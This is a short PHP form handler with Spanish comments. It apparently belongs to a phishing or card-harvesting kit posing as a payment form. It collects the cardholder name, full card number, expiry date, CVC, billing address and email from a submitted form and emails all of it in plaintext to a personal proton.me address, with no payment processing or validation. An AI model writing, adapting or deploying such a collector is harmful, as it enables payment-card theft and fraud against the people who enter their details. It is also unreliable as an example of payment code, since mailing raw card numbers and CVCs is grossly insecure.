<?php
// Configuración del correo
$to = 'victorberdugo518@proton.me'; // Reemplaza con la dirección de correo a la que se enviarán los datos
$subject = 'New Payment Form Submission';

// Obtención de los datos del formulario
$name = $_POST['cardholder-name'];
$cardNumber = $_POST['card-number'];
$expiryDate = $_POST['expiry-date'];
$cvc = $_POST['cvc'];
$address = $_POST['address-line'];
$city = $_POST['city'];
$state = $_POST['state'];
$zip = $_POST['zip'];
$email = $_POST['email'];

// Creación del cuerpo del correo
$message = "
<html>
<head>
    <title>Payment Form Submission</title>
</head>
<body>
    <h2>Payment Form Submission</h2>
    <p><strong>Cardholder Name:</strong> $name</p>
    <p><strong>Card Number:</strong> $cardNumber</p>
    <p><strong>Expiry Date:</strong> $expiryDate</p>
    <p><strong>CVC:</strong> $cvc</p>
    <p><strong>Address:</strong> $address</p>
    <p><strong>City:</strong> $city</p>
    <p><strong>State:</strong> $state</p>
    <p><strong>ZIP Code:</strong> $zip</p>
    <p><strong>Email Address:</strong> $email</p>
</body>
</html>
";

// Para enviar correos HTML, el encabezado Content-type debe ser definido
$headers = "MIME-Version: 1.0" . "\r\n";
$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";

// Adicionales encabezados
$headers .= 'From: <webmaster@example.com>' . "\r\n"; // Cambia la dirección del remitente si es necesario

// Enviar correo
if (mail($to, $subject, $message, $headers)) {
    echo "Correo enviado exitosamente.";
} else {
    echo "Error al enviar el correo.";
}
?>
v